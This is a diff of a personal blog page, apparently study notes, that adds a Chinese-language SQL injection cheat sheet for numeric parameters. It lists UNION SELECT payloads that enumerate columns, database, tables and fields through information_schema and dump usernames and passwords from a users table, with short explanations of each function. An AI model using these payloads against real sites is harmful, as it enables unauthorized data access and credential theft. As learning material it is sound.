@@ -45,7 +45,20 @@
         </div>
         
         <div class="article-content">
-            <h1 id="SQL类："><a href="#SQL类：" class="headerlink" title="#SQL类："></a>#SQL类：</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><hr>
+            <h1 id="SQL类："><a href="#SQL类：" class="headerlink" title="#SQL类："></a>#SQL类：</h1><hr>
+<h2 id="数字型："><a href="#数字型：" class="headerlink" title="#数字型："></a>#数字型：</h2><p><code>id=1 ORDER BY ?</code> <strong>(爆列)</strong></p>
+<p><code>id=-1 UNION SELECT 1, 2, 3</code> <strong>(回显确定)</strong></p>
+<p><code>id=-1 UNION SELECT 1, database(), 3(爆库)</code> <strong>(爆库)</strong></p>
+<p><code>id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema = &#39;数据库&#39;</code> <strong>(爆表)</strong></p>
+<p><code>id=-1 UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name = &#39;表名&#39;</code> <strong>(读表)</strong></p>
+<p><code>id=-1 UNION SELECT 1, group_concat(username, &#39;~&#39;, password), 3 FROM users</code> <strong>(读数据，username和password为表users的数据)</strong></p>
+<h3 id="语法积累："><a href="#语法积累：" class="headerlink" title="#语法积累："></a>#语法积累：</h3><p><code>information_schema.tables</code> ：记录表名的函数。</p>
+<p><code>WHERE table_schema=database()</code> ：过滤的函数，用来筛选表名。</p>
+<p><code>group_concat(table_name)</code> ：拼接读取的数据的函数。</p>
+<p><code>database()</code> ：显示当前数据库的函数。</p>
+<p><code>user()</code> ：显示当前登入用户的函数</p>
+<hr>
+<h2 id="字符型："><a href="#字符型：" class="headerlink" title="#字符型："></a>#字符型：</h2><hr>
 <p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
         </div>
@@ -54,6 +67,6 @@
 
 </div>
 
-<script src="/js/main.js?v=1766730868193"></script>
+<script src="/js/main.js?v=1766732056730"></script>
 </body>
 </html>
